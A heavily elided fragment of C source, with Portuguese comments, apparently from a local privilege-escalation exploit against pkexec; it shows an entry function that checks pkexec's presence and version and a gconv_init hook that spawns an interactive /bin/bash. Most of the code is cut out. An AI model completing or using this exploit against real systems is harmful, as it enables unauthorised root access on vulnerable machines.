...
void entry()
{
    ...
    if (fork() == 0)
    {
        ...
        if (strstr(buf, "pkexec --version") == buf) {
            // Caso o exploit não funcione, isso faz a limpeza.
    ...
    // Caso pkexec não esteja em /usr/bin/
...
void gconv_init()
{
    ...
    if (cmd) {
        ...
        // Tentar a interatividade com o bash primeiro
        execve("/bin/bash", (char *[]){"-i", NULL}, NULL);

        // Caso a interatividade com o bash não funcione
